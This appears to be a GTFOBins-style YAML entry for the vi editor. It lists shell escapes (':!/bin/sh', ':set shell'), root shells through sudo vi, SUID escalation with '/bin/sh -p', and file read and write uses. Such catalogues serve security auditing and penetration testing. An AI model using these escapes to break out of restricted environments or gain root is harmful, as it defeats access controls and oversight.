---
functions:
  execute-interactive:
    - code: vi -c ':!/bin/sh'
    - code: |
        vi
        :set shell=/bin/sh
        :shell
  sudo-enabled:
    - code: sudo vi -c ':!/bin/sh'
  suid-enabled:
    - code: ./vi -c ':!/bin/sh -p'
  file-read:
    - code: |
        vi file_to_read
  file-write:
    - code: |
        vi file_to_write
        w
---
